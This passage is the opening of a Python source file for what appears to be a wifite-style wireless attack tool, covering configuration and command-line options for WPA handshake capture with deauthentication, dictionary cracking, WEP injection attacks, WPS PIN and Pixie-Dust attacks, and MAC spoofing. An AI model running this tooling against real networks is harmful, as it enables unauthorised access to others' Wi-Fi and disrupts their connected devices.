#!/usr/bin/python

import csv  # Exporting and importing cracked aps
import os  # File management
import time  # Measuring attack intervals
import random  # Generating a random MAC address.
import errno  # Error numbers

from sys import argv  # Command-line arguments
from sys import stdout  # Flushing

from shutil import copy  # Copying .cap files

# Executing, communicating with, killing processes
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM

import re  # RegEx, Converting SSID to filename
import argparse  # arg parsing
import urllib.request, urllib.parse, urllib.error  # Check for new versions from the repo
import abc  # abstract base class libraries for attack templates


################################
# GLOBAL VARIABLES IN ALL CAPS #
################################

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

# /dev/null, send output from programs so they don't print to screen.
DN = open(os.devnull, 'w')
ERRLOG = open(os.devnull, 'w')
OUTLOG = open(os.devnull, 'w')

###################
# DATA STRUCTURES #
###################

def print_red(text):
    print("\033[31m" + text + "\033[0m", end=' ')


def print_green(text):
    if isinstance(text, bytes):
        text = text.decode("utf-8")
    print("\033[32m" + str(text) + "\033[0m")





class CapFile:
    """
        Holds data about an access point's .cap file, including AP's ESSID & BSSID.
    """

    def __init__(self, filename, ssid, bssid):
        self.filename = filename
        self.ssid = ssid
        self.bssid = bssid


class Target:
    """
        Holds data for a Target (aka Access Point aka Router)
    """

    def __init__(self, bssid, power, data, channel, encryption, ssid):
        self.bssid = bssid
        self.power = power
        self.data = data
        self.channel = channel
        self.encryption = encryption
        self.ssid = ssid
        self.wps = False  # Default to non-WPS-enabled router.
        self.key = ''


class Client:
    """
        Holds data for a Client (device connected to Access Point/Router)
    """

    def __init__(self, bssid, station, power):
        self.bssid = bssid
        self.station = station
        self.power = power


class RunConfiguration:
    """
        Configuration for this rounds of attacks
    """

    def __init__(self):
        self.REVISION = 89;
        self.PRINTED_SCANNING = False

        self.TX_POWER = 0  # Transmit power for wireless interface, 0 uses default power

        # WPA variables
        self.WPA_DISABLE = False  # Flag to skip WPA handshake capture
        self.WPA_STRIP_HANDSHAKE = True  # Use pyrit or tshark (if applicable) to strip handshake
        self.WPA_DEAUTH_COUNT = 1  # Count to send deauthentication packets
        self.WPA_DEAUTH_TIMEOUT = 10  # Time to wait between deauthentication bursts (in seconds)
        self.WPA_ATTACK_TIMEOUT = 500  # Total time to allow for a handshake attack (in seconds)
        self.WPA_HANDSHAKE_DIR = 'hs'  # Directory in which handshakes .cap files are stored
        # Strip file path separator if needed
        if self.WPA_HANDSHAKE_DIR != '' and self.WPA_HANDSHAKE_DIR[-1] == os.sep:
            self.WPA_HANDSHAKE_DIR = self.WPA_HANDSHAKE_DIR[:-1]

        self.WPA_FINDINGS = []  # List of strings containing info on successful WPA attacks
        self.WPA_DONT_CRACK = False  # Flag to skip cracking of handshakes
        if os.path.exists('/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'):
            self.WPA_DICTIONARY = '/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
        elif os.path.exists('/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'):
            self.WPA_DICTIONARY = '/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
        elif os.path.exists('/usr/share/wordlists/fern-wifi/common.txt'):
            self.WPA_DICTIONARY = '/usr/share/wordlists/fern-wifi/common.txt'
        else:
            self.WPA_DICTIONARY = ''

        # Various programs to use when checking for a four-way handshake.
        # True means the program must find a valid handshake in order for wifite to recognize a handshake.
        # Not finding handshake short circuits result (ALL 'True' programs must find handshake)
        self.WPA_HANDSHAKE_TSHARK = True  # Checks for sequential 1,2,3 EAPOL msg packets (ignores 4th)
        self.WPA_HANDSHAKE_PYRIT = False  # Sometimes crashes on incomplete dumps, but accurate.
        self.WPA_HANDSHAKE_AIRCRACK = True  # Not 100% accurate, but fast.
        self.WPA_HANDSHAKE_COWPATTY = False  # Uses more lenient "nonstrict mode" (-2)

        # WEP variables
        self.WEP_DISABLE = False  # Flag for ignoring WEP networks
        self.WEP_PPS = 600  # packets per second (Tx rate)
        self.WEP_TIMEOUT = 600  # Amount of time to give each attack
        self.WEP_ARP_REPLAY = True  # Various WEP-based attacks via aireplay-ng
        self.WEP_CHOPCHOP = True  #
        self.WEP_FRAGMENT = True  #
        self.WEP_CAFFELATTE = True  #
        self.WEP_P0841 = True
        self.WEP_HIRTE = True
        self.WEP_CRACK_AT_IVS = 10000  # Number of IVS at which we start cracking
        self.WEP_IGNORE_FAKEAUTH = True  # When True, continues attack despite fake authentication failure
        self.WEP_FINDINGS = []  # List of strings containing info on successful WEP attacks.
        self.WEP_SAVE = False  # Save packets.

        # WPS variables
        self.WPS_DISABLE = False  # Flag to skip WPS scan and attacks
        self.PIXIE = False
        self.WPS_FINDINGS = []  # List of (successful) results of WPS attacks
        self.WPS_TIMEOUT = 660  # Time to wait (in seconds) for successful PIN attempt
        self.WPS_RATIO_THRESHOLD = 0.01  # Lowest percentage of tries/attempts allowed (where tries > 0)
        self.WPS_MAX_RETRIES = 0  # Number of times to re-try the same pin before giving up completely.


        # Program variables
        self.SHOW_ALREADY_CRACKED = False  # Says whether to show already cracked APs as options to crack
        self.WIRELESS_IFACE = ''  # User-defined interface
        self.MONITOR_IFACE = ''  # User-defined interface already in monitor mode
        self.TARGET_CHANNEL = 0  # User-defined channel to scan on
        self.TARGET_ESSID = ''  # User-defined ESSID of specific target to attack
        self.TARGET_BSSID = ''  # User-defined BSSID of specific target to attack
        self.IFACE_TO_TAKE_DOWN = ''  # Interface that wifite puts into monitor mode
        # It's our job to put it out of monitor mode after the attacks
        self.ORIGINAL_IFACE_MAC = ('', '')  # Original interface name[0] and MAC address[1] (before spoofing)
        self.DO_NOT_CHANGE_MAC = True  # Flag for disabling MAC anonymizer
        self.SEND_DEAUTHS = True # Flag for deauthing clients while scanning for acces points
        self.TARGETS_REMAINING = 0  # Number of access points remaining to attack
        self.WPA_CAPS_TO_CRACK = []  # list of .cap files to crack (full of CapFile objects)
        self.THIS_MAC = ''  # The interfaces current MAC address.
        self.SHOW_MAC_IN_SCAN = False  # Display MACs of the SSIDs in the list of targets
        self.CRACKED_TARGETS = []  # List of targets we have already cracked
        self.ATTACK_ALL_TARGETS = False  # Flag for when we want to attack *everyone*
        self.ATTACK_MIN_POWER = 0  # Minimum power (dB) for access point to be considered a target
        self.VERBOSE_APS = True  # Print access points as they appear
        self.CRACKED_TARGETS = self.load_cracked()
        old_cracked = self.load_old_cracked()
        if len(old_cracked) > 0:
            # Merge the results
            for OC in old_cracked:
                new = True
                for NC in self.CRACKED_TARGETS:
                    if OC.bssid == NC.bssid:
                        new = False
                        break
                # If Target isn't in the other list
                # Add and save to disk
                if new:
                    self.save_cracked(OC)

    def ConfirmRunningAsRoot(self):
        if os.getuid() != 0:
            print_red('Run the program as root.')
            exit(1)

    def ConfirmCorrectPlatform(self):
        if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]:  # OSX support, 'cause why not?
            print(O + ' [!]' + R + ' WARNING:' + G + ' wifite' + W + ' must be run on ' + O + 'linux' + W)
            exit(1)

    def CreateTempFolder(self):
        from tempfile import mkdtemp

        self.temp = mkdtemp(prefix='wifite')
        if not self.temp.endswith(os.sep):
            self.temp += os.sep

    def save_cracked(self, target):
        """
            Saves cracked access point key and info to a file.
        """
        self.CRACKED_TARGETS.append(target)
        with open('cracked.csv', 'wb') as csvfile:
            targetwriter = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            for target in self.CRACKED_TARGETS:
                targetwriter.writerow([target.bssid, target.encryption, target.ssid, target.key, target.wps])

    def load_cracked(self):
        """
            Loads info about cracked access points into list, returns list.
        """
        result = []
        if not os.path.exists('cracked.csv'): return result
        with open('cracked.csv', 'rb') as csvfile:
            targetreader = csv.reader(csvfile, delimiter=',', quotechar='"')
            for row in targetreader:
                t = Target(row[0], 0, 0, 0, row[1], row[2])
                t.key = row[3]
                t.wps = row[4]
                result.append(t)
        return result

    def load_old_cracked(self):
        """
                Loads info about cracked access points into list, returns list.
        """
        result = []
        if not os.path.exists('cracked.txt'):
            return result
        fin = open('cracked.txt', 'r')
        lines = fin.read().split('\n')
        fin.close()

        for line in lines:
            fields = line.split(chr(0))
            if len(fields) <= 3:
                continue
            tar = Target(fields[0], '', '', '', fields[3], fields[1])
            tar.key = fields[2]
            result.append(tar)
        return result

    def exit_gracefully(self, code=0):
        """
            We may exit the program at any time.
            We want to remove the temp folder and any files contained within it.
            Removes the temp files/folder and exists with error code "code".
        """
        # Remove temp files and folder
        if os.path.exists(self.temp):
            for f in os.listdir(self.temp):
                os.remove(os.path.join(self.temp, f))
            os.rmdir(self.temp)
        # Disable monitor mode if enabled by us
        self.RUN_ENGINE.disable_monitor_mode()
        # Change MAC address back if spoofed
        mac_change_back()
        print(GR + " [+]" + W + " quitting")  # wifite will now exit"
        print('')
        # GTFO
        exit(code)

    def handle_args(self):
        """
            Handles command-line arguments, sets global variables.
        """
        set_encrypt = False
        set_hscheck = False
        set_wep = False
        capfile = ''  # Filename of .cap file to analyze for handshakes

        opt_parser = self.build_opt_parser()
        options = opt_parser.parse_args()

        try:
            if not set_encrypt and (options.wpa or options.wep or options.wps):
                self.WPS_DISABLE = True
                self.WPA_DISABLE = True
                self.WEP_DISABLE = True
                set_encrypt = True
            if options.recrack:
                self.SHOW_ALREADY_CRACKED = True
                print(GR + ' [+]' + W + ' including already cracked networks in targets.')
            if options.wpa:
                if options.wps:
                    print_green(GR + ' [+]' + W + ' Targeting ' + G + 'WPA' + W + ' Encrypted Networks.')
                else:
                    print_green(GR + ' [+]' + W + ' Targeting ' + G + 'WPA' + W + ' Encrypted Networks (use ' + G + '-wps' + W + ' for WPS scan)')
                self.WPA_DISABLE = False
            if options.wep:
                print_green(GR + ' [+]' + W + ' Targeting ' + G + 'WEP' + W + ' Encrypted Networks')
                self.WEP_DISABLE = False
            if options.wps:
                print(GR + ' [+]' + W + ' Targeting ' + G + 'WPS-Enabled' + W + ' Networks.')
                self.WPS_DISABLE = False
            if options.pixie:
                print(GR + ' [+]' + W + ' Targeting ' + G + 'WPS-Enabled' + W + ' networks.')
                print(GR + ' [+]' + W + ' Using only ' + G + 'WPS Pixie-Dust' + W + ' Attack.')
                self.WPS_DISABLE = False
                self.WEP_DISABLE = True
                self.PIXIE = True
            if options.channel:
                try:
                    self.TARGET_CHANNEL = int(options.channel)
                except ValueError:
                    print_red(O + ' [!]' + R + ' Invalid channel: ' + O + options.channel + W)
                except IndexError:
                    print_red(O + ' [!]' + R + ' No channel given!' + W)
                else:
                    print_green(GR + ' [+]' + W + ' Channel set to %s' % (G + str(self.TARGET_CHANNEL) + W))
            if options.mac_anon:
                print(GR + ' [+]' + W + ' Mac address anonymizing ' + G + 'enabled' + W)
                print(O + '      Note: Only works if device is not already in monitor mode!' + W)
                self.DO_NOT_CHANGE_MAC = False
            if options.interface:
                self.WIRELESS_IFACE = options.interface
                print_green(GR + ' [+]' + W + ' Set interface :%s' % (G + self.WIRELESS_IFACE + W))
            if options.monitor_interface:
                self.MONITOR_IFACE = options.monitor_interface
                print_green(GR + ' [+]' + W + ' Set interface already in monitor mode :%s' % (G + self.MONITOR_IFACE + W))
            if options.nodeauth:
                self.SEND_DEAUTHS = False
                print_green(GR + ' [+]' + W + ' Will not deauthenticate clients while scanning%s' % W)
            if options.essid:
                try:
                    self.TARGET_ESSID = options.essid
                except ValueError:
                    print_red(R + ' [!]' + O + ' No ESSID given!' + W)
                else:
                    print_green(GR + ' [+]' + W + ' Targeting ESSID "%s"' % (G + self.TARGET_ESSID + W))
            if options.bssid:
                try:
                    self.TARGET_BSSID = options.bssid
                except ValueError:
                    print(R + ' [!]' + O + ' No BSSID given!' + W)
                else:
                    print_green(GR + ' [+]' + W + ' targeting BSSID "%s"' % (G + self.TARGET_BSSID + W))
            if options.showb:
                self.SHOW_MAC_IN_SCAN = True
                print_green(GR + ' [+]' + W + ' Target MAC address viewing ' + G + 'enabled' + W)
            if options.all:
                self.ATTACK_ALL_TARGETS = True
                print_green(GR + ' [+]' + W + ' Targeting ' + G + 'ALL Access Points' + W)
            if options.power:
                try:
                    self.ATTACK_MIN_POWER = int(options.power)
                except ValueError:
                    print_red(R + ' [!]' + O + '  Invalid power level: %s' % (R + options.power + W))
                except IndexError:
                    print_red(R + ' [!]' + O + '  No power level given!' + W)
                else:
                    print_green(GR + ' [+]' + W + ' Minimum target power set to %s' % (G + str(self.ATTACK_MIN_POWER) + W))
            if options.tx:
                try:
                    self.TX_POWER = int(options.tx)
                except ValueError:
                    print(R + ' [!]' + O + ' invalid TX power leve: %s' % ( R + options.tx + W))
                except IndexError:
                    print(R + ' [!]' + O + ' no TX power level given!' + W)
                else:
                    print(GR + ' [+]' + W + ' TX power level set to %s' % (G + str(self.TX_POWER) + W))
            if options.quiet:
                self.VERBOSE_APS = False
                print(GR + ' [+]' + W + ' list of APs during scan ' + O + 'disabled' + W)
            if options.check:
                try:
                    capfile = options.check
                except IndexError:
                    print(R + ' [!]' + O + ' unable to analyze capture file' + W)
                    print(R + ' [!]' + O + ' no cap file given!\n' + W)
                    self.exit_gracefully(1)
                else:
                    if not os.path.exists(capfile):
                        print_red(R + ' [!]' + O + ' Unable to analyze capture file!' + W)
                        print_red(R + ' [!]' + O + ' file not found: ' + R + capfile + '\n' + W)
                        self.exit_gracefully(1)
            if options.cracked:
                if len(self.CRACKED_TARGETS) == 0:
                    print_red(R + ' [!]' + O + ' There are no cracked access points saved to ' + R + 'cracked.db\n' + W)
                    self.exit_gracefully(1)
                print(GR + ' [+]' + W + ' ' + W + 'previously cracked access points' + W + ':')
                for victim in self.CRACKED_TARGETS:
                    if victim.wps != False:
                        print('     %s (%s) : "%s" - Pin: %s' % (
                        C + victim.ssid + W, C + victim.bssid + W, G + victim.key + W, G + victim.wps + W))
                    else:
                        print('     %s (%s) : "%s"' % (C + victim.ssid + W, C + victim.bssid + W, G + victim.key + W))
                print('')
                self.exit_gracefully(0)
            # WPA
            if not set_hscheck and (options.tshark or options.cowpatty or options.aircrack or options.pyrit):
                self.WPA_HANDSHAKE_TSHARK = False
                self.WPA_HANDSHAKE_PYRIT = False
                self.WPA_HANDSHAKE_COWPATTY = False
                self.WPA_HANDSHAKE_AIRCRACK = False
                set_hscheck = True
            if options.strip:
                self.WPA_STRIP_HANDSHAKE = True
                print_green(GR + ' [+]' + W + ' Handshake Stripping ' + G + 'enabled' + W)
            if options.wpadt:
                try:
                    self.WPA_DEAUTH_TIMEOUT = int(options.wpadt)
                except ValueError:
                    print(R + ' [!]' + O + ' invalid deauth timeout: %s' % (R + options.wpadt + W))
                except IndexError:
                    print_red(R + ' [!]' + O + ' No Deauth Timeout Given!' + W)
                else:
                    print_red(GR + ' [+]' + W + ' WPA deauth timeout set to %s' % (G + str(self.WPA_DEAUTH_TIMEOUT) + W))
            if options.wpat:
                try:
                    self.WPA_ATTACK_TIMEOUT = int(options.wpat)
                except ValueError:
                    print_red(R + ' [!]' + O + ' Invalid attack timeout: %s' % (R + options.wpat + W))
                except IndexError:
                    print_red(R + ' [!]' + O + ' No attack timeout given!' + W)
                else:
                    print_red(GR + ' [+]' + W + ' WPA attack timeout set to %s' % (G + str(self.WPA_ATTACK_TIMEOUT) + W))
            if options.crack:
                self.WPA_DONT_CRACK = False
                print(GR + ' [+]' + W + ' WPA cracking ' + G + 'enabled' + W)
                if options.dic:
                    try:
                        self.WPA_DICTIONARY = options.dic
                    except IndexError:
                        print_red(R + ' [!]' + O + ' No WPA Dictionary Given!')
                    else:
                        if os.path.exists(options.dic):
                            print_green(GR + ' [+]' + W + ' WPA dictionary set to %s' % (G + self.WPA_DICTIONARY + W))
                        else:
                            print_red(R + ' [!]' + O + ' WPA dictionary file not found: %s' % (options.dic))
                else:
                    print(R + ' [!]' + O + ' WPA dictionary file not given!')
                    self.exit_gracefully(1)
            if options.tshark:
                self.WPA_HANDSHAKE_TSHARK = True
                print_green(GR + ' [+]' + W + ' Tshark handshake verification ' + G + 'enabled' + W)
            if options.pyrit:
                self.WPA_HANDSHAKE_PYRIT = True
                print_green(GR + ' [+]' + W + ' Pyrit handshake verification ' + G + 'enabled' + W)
            if options.aircrack:
                self.WPA_HANDSHAKE_AIRCRACK = True
                print_green(GR + ' [+]' + W + ' Aircrack handshake verification ' + G + 'enabled' + W)
            if options.cowpatty:
                self.WPA_HANDSHAKE_COWPATTY = True
                print_green(GR + ' [+]' + W + ' Cowpatty handshake verification ' + G + 'enabled' + W)

            # WEP
            if not set_wep and options.chopchop or options.fragment or options.caffeelatte or options.arpreplay \
                    or options.p0841 or options.hirte:
                self.WEP_CHOPCHOP = False
                self.WEP_ARPREPLAY = False
                self.WEP_CAFFELATTE = False
                self.WEP_FRAGMENT = False
                self.WEP_P0841 = False
                self.WEP_HIRTE = False
            if options.chopchop:
                print_green(GR + ' [+]' + W + ' WEP Chop-Chop attack ' + G + 'Enabled' + W)
                self.WEP_CHOPCHOP = True
            if options.fragment:
                print_green(GR + ' [+]' + W + ' WEP Fragmentation Attack ' + G + 'Enabled' + W)
                self.WEP_FRAGMENT = True
            if options.caffeelatte:
                print_green(GR + ' [+]' + W + ' WEP Caffe-Latte Attack ' + G + 'Enabled' + W)
                self.WEP_CAFFELATTE = True
            if options.arpreplay:
                print_green(GR + ' [+]' + W + ' WEP arp-replay attack ' + G + 'Enabled' + W)
                self.WEP_ARPREPLAY = True
            if options.p0841:
                print_green(GR + ' [+]' + W + ' WEP p0841 attack ' + G + 'Enabled' + W)
                self.WEP_P0841 = True
            if options.hirte:
                print_green(GR + ' [+]' + W + ' WEP hirte attack ' + G + 'Enabled' + W)
                self.WEP_HIRTE = True
            if options.fakeauth:
                print_red(GR + ' [+]' + W + ' Ignoring Failed Fake-Authentication ' + R + 'Disabled' + W)
                self.WEP_IGNORE_FAKEAUTH = False
            if options.wepca:
                try:
                    self.WEP_CRACK_AT_IVS = int(options.wepca)
                except ValueError:
                    print_green(R + ' [!]' + O + ' Invalid number: %s' % ( R + options.wepca + W ))
                except IndexError:
                    print_red(R + ' [!]' + O + ' No IV Number Specified!' + W)
                else:
                    print_green(GR + ' [+]' + W + ' Starting WEP Cracking When IV\'s Surpass %s' % (
                    G + str(self.WEP_CRACK_AT_IVS) + W))
            if options.wept:
                try:
                    self.WEP_TIMEOUT = int(options.wept)
                except ValueError:
                    print_red(R + ' [!]' + O + ' Invalid Timeout: %s' % (R + options.wept + W))
                except IndexError:
                    print_red(R + ' [!]' + O + ' No Timeout Given!' + W)
                else:
                    print_green(GR + ' [+]' + W + ' WEP Attack Timeout Set To %s' % (
                    G + str(self.WEP_TIMEOUT) + " Seconds" + W))
            if options.pps:
                try:
                    self.WEP_PPS = int(options.pps)
                except ValueError:
                    print(R + ' [!]' + O + ' Invalid Value: %s' % (R + options.pps + W))
                except IndexError:
                    print(R + ' [!]' + O + ' No value given!' + W)
                else:
                    print(GR + ' [+]' + W + ' packets-per-second rate set to %s' % (
                    G + str(options.pps) + " packets/sec" + W))
            if options.wepsave:
                self.WEP_SAVE = True
                print_green(GR + ' [+]' + W + ' WEP .cap file saving ' + G + 'enabled' + W)

            # WPS
            if options.wpst:
                try:
                    self.WPS_TIMEOUT = int(options.wpst)
                except ValueError:
                    print(R + ' [!]' + O + ' invalid timeout: %s' % (R + options.wpst + W))
                except IndexError:
                    print(R + ' [!]' + O + ' no timeout given!' + W)
                else:
                    print(GR + ' [+]' + W + ' WPS attack timeout set to %s' % (
                    G + str(self.WPS_TIMEOUT) + " seconds" + W))
            if options.wpsratio:
                try:
                    self.WPS_RATIO_THRESHOLD = float(options.wpsratio)
                except ValueError:
                    print(R + ' [!]' + O + ' invalid percentage: %s' % (R + options.wpsratio + W))
                except IndexError:
                    print(R + ' [!]' + O + ' no ratio given!' + W)
                else:
                    print(GR + ' [+]' + W + ' minimum WPS tries/attempts threshold set to %s' % (
                    G + str(self.WPS_RATIO_THRESHOLD) + "" + W))
            if options.wpsretry:
                try:
                    self.WPS_MAX_RETRIES = int(options.wpsretry)
                except ValueError:
                    print_red(R + ' [!]' + O + ' Invalid number: %s' % (R + options.wpsretry + W))
                except IndexError:
                    print_red(R + ' [!]' + O + ' No number given!' + W)
                else:
                    print_green(GR + ' [+]' + W + ' WPS maximum retries set to %s' % (
                    G + str(self.WPS_MAX_RETRIES) + " Retries" + W))

        except IndexError:
            print('\nindexerror\n\n')

        if capfile != '':
            self.RUN_ENGINE.analyze_capfile(capfile)
        print('')

    def build_opt_parser(self):
        """ Options are doubled for backwards compatability; will be removed soon and
            fully moved to GNU-style
        """
        option_parser = argparse.ArgumentParser()

        # set commands
        command_group = option_parser.add_argument_group('COMMAND')
        command_group.add_argument('--check', help='Check capfile [file] for handshakes.', action='store', dest='check')
        command_group.add_argument('-check', action='store', dest='check', help=argparse.SUPPRESS)
        command_group.add_argument('--cracked', help='Display previously cracked access points.', action='store_true',
                                   dest='cracked')
        command_group.add_argument('-cracked', help=argparse.SUPPRESS, action='store_true', dest='cracked')
        command_group.add_argument('--recrack', help='Include already cracked networks in targets.',
                                   action='store_true', dest='recrack')
        command_group.add_argument('-recrack', help=argparse.SUPPRESS, action='store_true', dest='recrack')

        # set global
        global_group = option_parser.add_argument_group('GLOBAL')
        global_group.add_argument('--all', help='Attack all targets.', default=False, action='store_true', dest='all')
        global_group.add_argument('-all', help=argparse.SUPPRESS, default=False, action='store_true', dest='all')
        global_group.add_argument('-i', help='Wireless interface for capturing.', action='store', dest='interface')
        global_group.add_argument('--mac', help='Anonymize MAC address.', action='store_true', default=False,
                                  dest='mac_anon')
        global_group.add_argument('-mac', help=argparse.SUPPRESS, action='store_true', default=False, dest='mac_anon')
        global_group.add_argument('--mon-iface', help='Interface already in monitor mode.', action='store',
                                  dest='monitor_interface')
        global_group.add_argument('-c', help='Channel to scan for targets.', action='store', dest='channel')
        global_group.add_argument('-e', help='Target a specific access point by ssid (name).', action='store',
                                  dest='essid')
        global_group.add_argument('-b', help='Target a specific access point by bssid (mac).', action='store',
                                  dest='bssid')
        global_group.add_argument('--showb', help='Display target BSSIDs after scan.', action='store_true',
                                  dest='showb')
        global_group.add_argument('-showb', help=argparse.SUPPRESS, action='store_true', dest='showb')
        global_group.add_argument('--nodeauth', help='Do not deauthenticate clients while scanning', action='store_true', dest='nodeauth')
        global_group.add_argument('--power', help='Attacks any targets with signal strength > [pow].', action='store',
                                  dest='power')
        global_group.add_argument('-power', help=argparse.SUPPRESS, action='store', dest='power')
        global_group.add_argument('--tx', help='Set adapter TX power level.', action='store', dest='tx')
        global_group.add_argument('-tx', help=argparse.SUPPRESS, action='store', dest='tx')
        global_group.add_argument('--quiet', help='Do not print list of APs during scan.', action='store_true',
                                  dest='quiet')
        global_group.add_argument('-quiet', help=argparse.SUPPRESS, action='store_true', dest='quiet')
        # set wpa commands
        wpa_group = option_parser.add_argument_group('WPA')
        wpa_group.add_argument('--wpa', help='Only target WPA networks (works with --wps --wep).', default=False,
                               action='store_true', dest='wpa')
        wpa_group.add_argument('-wpa', help=argparse.SUPPRESS, default=False, action='store_true', dest='wpa')
        wpa_group.add_argument('--wpat', help='Time to wait for WPA attack to complete (seconds).', action='store',
                               dest='wpat')
        wpa_group.add_argument('-wpat', help=argparse.SUPPRESS, action='store', dest='wpat')
        wpa_group.add_argument('--wpadt', help='Time to wait between sending deauth packets (seconds).', action='store',
                               dest='wpadt')
        wpa_group.add_argument('-wpadt', help=argparse.SUPPRESS, action='store', dest='wpadt')
        wpa_group.add_argument('--strip', help='Strip handshake using tshark or pyrit.', default=False,
                               action='store_true', dest='strip')
        wpa_group.add_argument('-strip', help=argparse.SUPPRESS, default=False, action='store_true', dest='strip')
        wpa_group.add_argument('--crack', help='Crack WPA handshakes using [dic] wordlist file.', action='store_true',
                               dest='crack')
        wpa_group.add_argument('-crack', help=argparse.SUPPRESS, action='store_true', dest='crack')
        wpa_group.add_argument('--dict', help='Specificy dictionary to use when cracking WPA.', action='store',
                               dest='dic')
        wpa_group.add_argument('-dict', help=argparse.SUPPRESS, action='store', dest='dic')
        wpa_group.add_argument('--aircrack', help='Verify handshake using aircrack.', default=False,
                               action='store_true', dest='aircrack')
        wpa_group.add_argument('-aircrack', help=argparse.SUPPRESS, default=False, action='store_true', dest='aircrack')
        wpa_group.add_argument('--pyrit', help='Verify handshake using pyrit.', default=False, action='store_true',
                               dest='pyrit')
        wpa_group.add_argument('-pyrit', help=argparse.SUPPRESS, default=False, action='store_true', dest='pyrit')
        wpa_group.add_argument('--tshark', help='Verify handshake using tshark.', default=False, action='store_true',
                               dest='tshark')
        wpa_group.add_argument('-tshark', help=argparse.SUPPRESS, default=False, action='store_true', dest='tshark')
        wpa_group.add_argument('--cowpatty', help='Verify handshake using cowpatty.', default=False,
                               action='store_true', dest='cowpatty')
        wpa_group.add_argument('-cowpatty', help=argparse.SUPPRESS, default=False, action='store_true', dest='cowpatty')
        # set WEP commands
        wep_group = option_parser.add_argument_group('WEP')
        wep_group.add_argument('--wep', help='Only target WEP networks.', default=False, action='store_true',
                               dest='wep')
        wep_group.add_argument('-wep', help=argparse.SUPPRESS, default=False, action='store_true', dest='wep')
        wep_group.add_argument('--pps', help='Set the number of packets per second to inject.', action='store',
                               dest='pps')
        wep_group.add_argument('-pps', help=argparse.SUPPRESS, action='store', dest='pps')
        wep_group.add_argument('--wept', help='Sec to wait for each attack, 0 implies endless.', action='store',
                               dest='wept')
        wep_group.add_argument('-wept', help=argparse.SUPPRESS, action='store', dest='wept')
        wep_group.add_argument('--chopchop', help='Use chopchop attack.', default=False, action='store_true',
                               dest='chopchop')
        wep_group.add_argument('-chopchop', help=argparse.SUPPRESS, default=False, action='store_true', dest='chopchop')
        wep_group.add_argument('--arpreplay', help='Use arpreplay attack.', default=False, action='store_true',
                               dest='arpreplay')
        wep_group.add_argument('-arpreplay', help=argparse.SUPPRESS, default=False, action='store_true',
                               dest='arpreplay')
        wep_group.add_argument('--fragment', help='Use fragmentation attack.', default=False, action='store_true',
                               dest='fragment')
        wep_group.add_argument('-fragment', help=argparse.SUPPRESS, default=False, action='store_true', dest='fragment')
        wep_group.add_argument('--caffelatte', help='Use caffe-latte attack.', default=False, action='store_true',
                               dest='caffeelatte')
        wep_group.add_argument('-caffelatte', help=argparse.SUPPRESS, default=False, action='store_true',
                               dest='caffeelatte')
        wep_group.add_argument('--p0841', help='Use P0842 attack.', default=False, action='store_true', dest='p0841')
        wep_group.add_argument('-p0841', help=argparse.SUPPRESS, default=False, action='store_true', dest='p0841')
        wep_group.add_argument('--hirte', help='Use hirte attack.', default=False, action='store_true', dest='hirte')
        wep_group.add_argument('-hirte', help=argparse.SUPPRESS, default=False, action='store_true', dest='hirte')
        wep_group.add_argument('--nofakeauth', help='Stop attack if fake authentication fails.', default=False,
                               action='store_true', dest='fakeauth')
        wep_group.add_argument('-nofakeauth', help=argparse.SUPPRESS, default=False, action='store_true',
                               dest='fakeauth')
        wep_group.add_argument('--wepca', help='Start cracking when number of IVs surpass [n].', action='store',
                               dest='wepca')
        wep_group.add_argument('-wepca', help=argparse.SUPPRESS, action='store', dest='wepca')
        wep_group.add_argument('--wepsave', help='Save a copy of .cap files to this directory.', default=None,
                               action='store', dest='wepsave')
        wep_group.add_argument('-wepsave', help=argparse.SUPPRESS, default=None, action='store', dest='wepsave')
        # set WPS commands
        wps_group = option_parser.add_argument_group('WPS')
        wps_group.add_argument('--wps', help='Only target WPS networks.', default=False, action='store_true',
                               dest='wps')
        wps_group.add_argument('-wps', help=argparse.SUPPRESS, default=False, action='store_true', dest='wps')
        wps_group.add_argument('--pixie', help='Only use the WPS PixieDust attack', default=False, action='store_true', dest='pixie')
        wps_group.add_argument('--wpst', help='Max wait for new retry before giving up (0: never).', action='store',
                               dest='wpst')
        wps_group.add_argument('-wpst', help=argparse.SUPPRESS, action='store', dest='wpst')
        wps_group.add_argument('--wpsratio', help='Min ratio of successful PIN attempts/total retries.', action='store',
                               dest='wpsratio')
        wps_group.add_argument('-wpsratio', help=argparse.SUPPRESS, action='store', dest='wpsratio')
        wps_group.add_argument('--wpsretry', help='Max number of retries for same PIN before giving up.',
                               action='store', dest='wpsretry')
        wps_group.add_argument('-wpsretry', help=argparse.SUPPRESS, action='store', dest='wpsretry')

        return option_parser


class RunEngine:
    def __init__(self, run_config):
        self.RUN_CONFIG = run_config
        self.RUN_CONFIG.RUN_ENGINE = self

    def initial_check(self):
        """
            Ensures required programs are installed.
        """
        airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng']
        for air in airs:
            if program_exists(air): continue
            print(R + ' [!]' + O + ' required program not found: %s' % (R + air + W))
            print(R + ' [!]' + O + ' this program is bundled with the aircrack-ng suite:' + W)
            print(R + ' [!]' + O + '        ' + C + 'http://www.aircrack-ng.org/' + W)
            print(R + ' [!]' + O + ' or: ' + W + 'sudo apt install aircrack-ng\n' + W)
            self.RUN_CONFIG.exit_gracefully(1)

        if not program_exists('iw'):
            print(R + ' [!]' + O + ' Airmon-ng requires the program %s\n' % (R + 'iw' + W))
            self.RUN_CONFIG.exit_gracefully(1)

        if not program_exists('iwconfig'):
            print(R + ' [!]' + O + ' Wifite requires the program %s\n' % (R + 'iwconfig' + W))
            self.RUN_CONFIG.exit_gracefully(1)

        if not program_exists('ifconfig'):
            print(R + ' [!]' + O + ' Wifite requires the program %s\n' % (R + 'ifconfig' + W))
            self.RUN_CONFIG.exit_gracefully(1)

        printed = False
        # Check reaver
        if not program_exists('reaver'):
            printed = True
